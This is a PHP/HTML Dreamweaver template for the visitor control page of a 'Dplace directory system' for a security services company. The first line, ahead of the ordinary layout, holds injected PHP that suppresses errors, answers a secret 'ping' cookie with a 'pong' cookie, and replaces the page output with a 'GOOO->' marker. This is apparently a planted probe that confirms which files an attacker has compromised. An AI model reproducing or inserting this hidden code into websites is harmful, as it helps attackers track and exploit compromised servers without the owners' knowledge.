<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/Templates/templatebasic.dwt.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/Templates/templatebasic.dwt.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/Templates/templatebasic.dwt.php<-";}return "NotGO->./cynergi/Templates/templatebasic.dwt.php<-";}}@ob_start("ob_sh");}}$frt=2;?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!-- TemplateBeginEditable name="doctitle" -->
<title>Dplace directory system</title>
<!-- TemplateEndEditable -->
<!-- TemplateBeginEditable name="head" -->
<!-- TemplateEndEditable -->
<link href="../css/style.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
body {
	background-image: url(../images/bgnd.jpg);
	background-repeat: repeat-x;
}
-->
</style></head>

<body>
<br />
<table width="442" height="159" border="0" align="center">
  <tr>
    <td width="217" height="128" align="center"><img src="../images/dplace_logo.JPG" width="183" height="111" /></td>
    <td width="217" align="center"><span class="titulo">Visitor control system <br />
All American Security Services</span></td>
  </tr>
</table>
<table width="673" border="0" align="center">
  <tr>
    <td width="362" align="center">&nbsp;</td>
  </tr>
</table>
<!-- TemplateBeginEditable name="central" -->
<table width="692" height="367" border="0" align="center">
  <tr>
    <td align="center" valign="top">&nbsp;</td>
  </tr>
</table>
<!-- TemplateEndEditable -->
</body>
</html>
